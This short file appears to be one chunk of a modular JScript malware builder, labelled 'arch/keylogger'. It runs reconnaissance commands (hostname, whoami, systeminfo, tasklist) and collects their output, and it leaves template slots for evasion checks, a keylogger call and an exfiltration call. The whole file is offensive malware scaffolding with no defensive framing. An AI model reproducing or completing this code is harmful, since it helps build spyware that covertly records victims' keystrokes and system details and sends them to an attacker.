// chunk: arch/keylogger
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: main
// format: jscript

{{EVASION_CHECKS}}

emit("=== SYSTEM INFO ===\r\n");
emit(_run("hostname") + "\r\n");
emit(_run("whoami") + "\r\n");
emit(_run("systeminfo") + "\r\n");

emit("=== RUNNING PROCESSES ===\r\n");
emit(_run("tasklist /fo csv /nh") + "\r\n");

emit("=== KEYLOG STATUS ===\r\n");
{{KEYLOGGER_CALL}}

{{EXFIL_CALL}}
